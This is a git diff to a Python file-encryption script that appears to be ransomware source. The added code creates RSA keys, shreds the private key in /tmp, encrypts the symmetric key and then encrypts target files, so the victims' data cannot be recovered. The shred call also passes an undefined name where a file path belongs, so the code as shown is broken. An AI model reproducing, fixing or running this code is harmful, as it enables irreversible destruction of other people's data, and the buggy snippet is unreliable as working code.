@@ -1,9 +1,10 @@
 #!/usr/bin/sudo python3
 
 import sys
-from os import system
+import os
+import subprocess as sp
 
-from utils import create_symmetric_key, encrypt_target_files
+from utils import create_symmetric_key, create_asymmetic_key, encrypt_symmetric_key,  encrypt_target_files
 from config import starter_text, Color
 
 def encrypt():
@@ -12,19 +13,28 @@ def encrypt():
 
 		# Symmetric key stuff
 		symmetric_key , symmetric_key_path = create_symmetric_key()
-		print(Color.WHITE + f'Key Created Successfully: {symmetric_key}')
-		print(Color.WHITE + 'Key stored in ' + symmetric_key_path)
-
+		print(Color.WHITE + f'[*] Key Created Successfully: {symmetric_key}')
+		print(Color.WHITE + '[*] Key stored in ' + symmetric_key_path)
+		# Asymmetric key stuff
+		create_asymmetic_key()
+		print(Color.WHITE + '[*] RSA Keys Created Successfully In /tmp Directory')
+		print(Color.WHITE + '[*] Shredding Private Key ...')
+		os.chdir('/tmp')
+		sp.call(['shred', '-zvun', '25', privatekey.key])
+		print(Color.WHITE + '[*] Key Deleted Successfully')
+		# Encrypt symmetric key
+		encrypt_symmetric_key()
+		print('[*] Symmetric Key Encrypted !')
 		# Encrypt files
-		print('\nLocating Target Files')
-		print('Beginning Crypto Operations')
+		print('\n[*] Locating Target Files')
+		print('[*] Beginning Crypto Operations')
 		encrypt_target_files(symmetric_key)
 
 	except KeyboardInterrupt:
-		print(Color.RED + 'Ctrl +C pressed!!Exiting....')
+		print(Color.RED + '[-]Ctrl +C pressed!!Exiting....')
 		sys.exit()
 
 if __name__ == "__main__":
-	system('clear')
+	os.system('clear')
 	encrypt()
 	print(Color.RED + '[*] File Encryption Done!')
